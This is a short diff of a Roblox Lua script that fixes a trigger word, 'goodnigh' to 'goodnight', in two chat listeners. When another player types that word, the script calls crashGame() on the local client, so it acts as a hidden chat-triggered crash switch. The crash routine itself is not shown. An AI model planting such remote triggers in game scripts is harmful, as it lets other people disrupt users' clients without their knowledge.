@@ -24,7 +24,7 @@ end
 
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     TextChatService.MessageReceived:Connect(function(message)
-        if message.Text:lower() == "goodnigh" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
+        if message.Text:lower() == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
             crashGame()
         end
     end)
@@ -41,7 +41,7 @@ local function setupLegacyChat()
     Players.PlayerAdded:Connect(function(player)
         if player ~= LocalPlayer then
             player.Chatted:Connect(function(msg)
-                if msg:lower() == "goodnigh" then crashGame() end
+                if msg:lower() == "goodnight" then crashGame() end
             end)
         end
     end)
